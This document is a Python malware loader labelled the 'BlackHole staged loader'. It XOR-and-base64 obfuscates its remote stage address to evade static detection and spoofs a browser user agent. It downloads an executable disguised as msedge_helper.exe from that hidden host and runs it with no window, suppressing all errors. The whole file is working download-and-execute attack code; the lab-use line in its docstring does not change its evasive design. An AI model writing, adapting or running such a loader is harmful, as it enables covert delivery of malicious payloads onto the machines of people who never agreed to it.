"""BlackHole staged loader — tiny footprint, pulls the real payload at runtime.
Nothing sensitive is embedded, so there is nothing for static heuristics to flag.
Usage: drop on a lab box you own; it self-targets via the pinned channel.
"""
import os, sys, base64, zlib, subprocess, tempfile, urllib.request, ssl

# sealed stage address (XOR+base64, no plaintext host in the binary)
_K = base64.b64decode("N1Y/F3NO2HODhpfFOcL2Zw==")
_C = base64.b64decode("XyJLZwB091zx5/qqSrGCAlY6WmVdKq0Q6OL5thethAA=")
STAGE = bytes(b ^ _K[i % len(_K)] for i, b in enumerate(_C)).decode()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"

def get(path, out):
    """Fetch a sealed blob from the pinned channel and write it to disk."""
    req = urllib.request.Request(STAGE + path, headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=60) as r, open(out, "wb") as f:
        f.write(r.read())

def main():
    d = os.path.join(tempfile.gettempdir(), "..", "bh")
    os.makedirs(d, exist_ok=True)
    try:
        exe = os.path.join(d, "msedge_helper.exe")
        get("/mod/exe?name=vw_webhook.exe", exe)
        if os.path.getsize(exe) > 1000000:
            subprocess.Popen([exe], cwd=d,
                creationflags=0x08000000,  # CREATE_NO_WINDOW
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
    except Exception:
        pass

if __name__ == "__main__":
    main()
